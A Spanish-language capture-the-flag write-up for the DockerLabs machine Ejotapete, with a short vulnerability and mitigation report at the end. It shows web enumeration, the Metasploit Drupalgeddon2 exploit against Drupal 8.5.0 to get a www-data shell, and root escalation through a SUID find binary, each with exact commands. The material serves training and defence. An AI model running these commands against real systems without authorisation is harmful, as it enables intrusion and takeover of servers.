# Ejotapete

> Drupal 8.5.0 vulnerable a Drupalgeddon2 explotado con Metasploit para shell de www-data, y escalada a root abusando del bit SUID en find.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Fácil |
| **Objetivo** | `172.17.0.2` |
| **Servicios** | 80/tcp (HTTP) |
| **Saltos de usuario** | 2 |

**Tags:** `Gobuster` · `Drupal` · `Drupalgeddon2` · `Metasploit` · `SUID find` · `GTFOBins`

---

## Reconocimiento

```bash
$ sudo nmap -sCV -sS -n -Pn -p- 172.17.0.2
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd
```

Solo el 80 (HTTP). Todo el juego está en la web.

## Enumeración web

```bash
$ gobuster dir -u http://172.17.0.2 -w directory-list-2.3-medium.txt -t 50
/drupal               (Status: 301)
```

`/drupal/` solo muestra un login que redirige. Fuzzeo más a fondo dentro de `core/`.

```bash
$ gobuster dir -u http://172.17.0.2/drupal/core/ -w directory-list-2.3-medium.txt -x html,php,txt,py,sh,log
/install.php          (Status: 200)   <-- revela la versión del CMS
```

`install.php` me chiva la versión exacta: **Drupal 8.5.0**.

## Explotación · Drupalgeddon2

Drupal 8.5.0 es vulnerable a Drupalgeddon2 (ejecución remota de código). Lo exploto con Metasploit.

```bash
$ sudo msfdb init && msfconsole
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
msf6 > set RHOSTS 172.17.0.2
msf6 > set TARGETURI /drupal
msf6 > run
[*] Meterpreter session 1 opened
meterpreter >
```

## Escalada a root · SUID find

Desde meterpreter lanzo una shell interactiva, la estabilizo y busco binarios SUID.

```bash
meterpreter > shell
$ script /dev/null -c bash
www-data@a49dee0a69db:/var/www/html/drupal$ find / -perm -4000 2>/dev/null
...
/usr/bin/find   <-- abusable (GTFOBins)
```

`/usr/bin/find` con SUID puede lanzar un shell privilegiado con `-exec`.

```bash
$ /usr/bin/find . -exec /bin/bash -p \; -quit
# whoami
root
```

Máquina Ejotapete completada: Drupalgeddon2 + SUID find → root.

---

## Informe · vulnerabilidades y mitigaciones

### 🔴 CRÍTICA — RCE en Drupal 8.5.0 (Drupalgeddon2, CVE-2018-7600)

`CWE-94` · A06:2021 – Vulnerable and Outdated Components

**Impacto.** Una versión de Drupal sin parchear permite ejecución remota de código sin autenticación, dando una shell como www-data.

**Mitigación.** Mantener el CMS y sus módulos actualizados; aplicar los parches de seguridad y retirar instalaciones expuestas como install.php.

### 🔴 CRÍTICA — Escalada a root por bit SUID en /usr/bin/find

`CWE-250` · A05:2021 – Security Misconfiguration

**Impacto.** find con SUID de root permite lanzar un shell privilegiado con -exec, pasando de www-data a root.

**Mitigación.** Quitar el SUID (chmod u-s /usr/bin/find) y auditar los binarios con SUID.

---

_Writeup de **Ejotapete** · DockerLabs · por [ak1t4](https://github.com/ak1ta4)_
